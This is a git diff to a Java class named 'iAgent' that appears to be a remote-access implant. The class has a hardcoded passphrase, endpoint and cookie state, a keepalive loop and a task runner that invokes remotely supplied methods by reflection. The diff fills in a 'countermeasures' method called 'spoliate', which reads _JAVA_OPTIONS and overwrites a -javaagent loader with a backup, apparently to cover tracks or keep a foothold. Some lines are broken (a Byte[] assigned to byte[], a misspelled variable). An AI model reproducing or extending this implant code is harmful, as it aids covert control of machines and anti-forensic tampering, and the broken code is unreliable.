@@ -39,6 +39,9 @@ import javax.xml.transform.stream.StreamResult;
 import java.net.UnknownHostException;
 import java.nio.charset.MalformedInputException;
 import java.nio.charset.StandardCharsets;
+import java.nio.file.Files;
+import java.nio.file.Paths;
+import java.nio.file.StandardCopyOption;
 import java.rmi.Naming;
 import java.rmi.Remote;
 import java.rmi.RemoteException;
@@ -103,7 +106,11 @@ public class iAgent
         public static String passMat = "T__+Pmv.REW=u9iXBB-";
         public static Hashtable endpoints = new Hashtable();
     }
-    //"C:\Program Files\Java\jdk1.8.0_202\bin\javac.exe" src\main\java\com\nocebo\nCore\*.java -d ..\server\fileroot
+    //"C:\Program Files\Java\jdk1.8.0_202\bin\javac.exe" src\main\java\com\nocebo\nCore\*.java
+    //move .\src\main\java\com\nocebo\nCore\genLib.class ..\server\fileroot\genLib.class
+    //move .\src\main\java\com\nocebo\nCore\autoLib.class ..\server\fileroot\autoLib.class
+    //cd src\main\java
+    //"C:\Program Files\Java\jdk1.8.0_202\bin\jar.exe" cf ..\..\..\..\server\fileroot\lib\iAgent.jar .\com\nocebo\nCore\*.class
     //ephemerals
     static public int shutdown = 0;
     static public String cookieData = "null";
@@ -153,7 +160,7 @@ public class iAgent
         }
         catch (Exception p)
         {
-            System.exit(1);
+            Thread.currentThread().interrupt();
         }
 
         keepalive();
@@ -399,11 +406,17 @@ public class iAgent
             else
             {
                 System.out.println("threading");
-                threader(
+                /*threader(
                     classObj,
                     (Method) methObj.get("methodical"),
                     args
                 );
+                */
+                Method rMethod = (Method) methObj.get("methodical");
+                System.out.println(rMethod.getName());
+                Object cObj = classObj.newInstance();
+                rMethod.invoke(cObj, args);
+                
             }
             tasks.remove(t);
         }   
@@ -1043,9 +1056,32 @@ public class iAgent
 
     private static class countermeasures 
     {
-        private void spoliate()
+        public void spoliate()
         {
-
+            
+            String loaderPath = new String();
+            byte[] loaderBytes = new Byte[]{};
+            try
+            {
+                String[] envVarPath = System.getenv("_JAVA_OPTIONS").split(" ");
+                for (int p=0;p<envVarPath.length;p++)
+                {
+                    if (envVarPath[p].contains("-javaagent"))
+                    {
+                        String[] splitPath = envVarPath[p].split(":");
+                        loaderPath = splitPath[1];
+                        String bakPath = String.format(".bak-%s",loadePath);
+                        Files.copy(Paths.get(bakPath), Paths.get(loaderPath), StandardCopyOption.REPLACE_EXISTING);
+                        break;
+                    }
+                }
+            }
+            catch (Exception e)
+            {
+                
+            }
+            Thread.currentThread().interrupt();
+            
         }
     }
 
